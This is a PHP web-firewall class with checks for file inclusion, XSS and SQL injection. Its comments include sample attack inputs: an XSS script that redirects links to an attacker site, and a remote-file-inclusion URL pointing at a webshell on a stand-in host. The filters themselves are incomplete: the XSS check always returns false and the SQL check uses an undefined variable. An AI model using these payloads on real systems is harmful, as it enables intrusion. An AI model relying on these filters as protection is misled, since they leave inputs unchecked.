<?php
class SFirewall
{
    
    function filter(){
        
        require_once(LIB_DIR."firewall/xss.php");
        
        $uri = "http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
        
        /**
         * Local file inclusion
         */
        if($this->isLFI($uri)){
            die("Local file inclusion is disabled!");
        }
        /**
         * Remote file inclusion
         */
        if($this->isRFI($uri)){
            die("Remote file inclusion is disabled!");
        }
        
        
        /**
         * Cleans input
         */
        SFirewallXSS::filter($_GET);
        SFirewallXSS::filter($_POST);
        
    }
    
    /**
     * @todo finish this. it fails to validate:
     *  ?name=<script>window%2eonload%20%3d%20function%28%29%20%7bvar%20link%3ddocument%2egetElementsByTagName%28"a"%29%3blink%5b0%5d%2ehref%3d"http%3a%2f%2fattacker-site%2ecom%2f"%3b%7d<%2fscript>
     * 
     * @param string $uri
     * @return boolean
     */
    protected function isXSS($uri) {
        
        if(!filter_var($uri, FILTER_VALIDATE_URL,FILTER_FLAG_QUERY_REQUIRED))
        {
          echo "URL is not valid";
        }else{
          echo "URL is valid";
        }
        return false;
    }
        
    protected function isLFI($uri) {
            if (preg_match('#\.\/#is', $uri, $match)) {
                    return array(
                            'match' => $match[0],
                            'uri'	=> $uri
                    );
            }
            return false;
    }

    /**
     * Test: ?COLOR=http://evil.example.com/webshell.txt?
     * 
     * @staticvar type $exceptions
     * @param type $uri
     * @return boolean
     */
    protected function isRFI($uri) {
            static $exceptions;
            if (!is_array($exceptions)) {
                    $exceptions = array();
                    // attempt to remove instances of our website from the URL...
                    $domain = ROOT_HOST;
                    $exceptions[] = 'http://'.$domain;
                    $exceptions[] = 'https://'.$domain;
                    // also remove blank entries that do not pose a threat
                    $exceptions[] = 'http://&';
                    $exceptions[] = 'https://&';
            }

            $uri = str_replace($exceptions, '', $uri);

            if (preg_match('#=https?:\/\/.*#is', $uri, $match)) {
                    return array(
                            'match' => $match[0],
                            'uri'	=> $uri
                    );
            }
            return false;
    }

    protected function isSQLi($uri) {
            if (preg_match('#[\d\W](union select|union join|union distinct)[\d\W]#is', $uri, $match)) {
                    return array(
                            'match' => $match[0],
                            'uri'	=> $uri
                    );
            }

            // check for SQL operations with a table name in the URI
            if (preg_match('#[\d\W](union|union select|insert|from|where|concat|into|cast|truncate|select|delete|having)[\d\W]#is', $uri, $match) && (preg_match('/'.preg_quote($prefix).'/', $uri, $match) )) {
                    return array(
                            'match' => $match[0],
                            'uri'	=> $uri
                    );
            }

            return false;
    }
	
    
}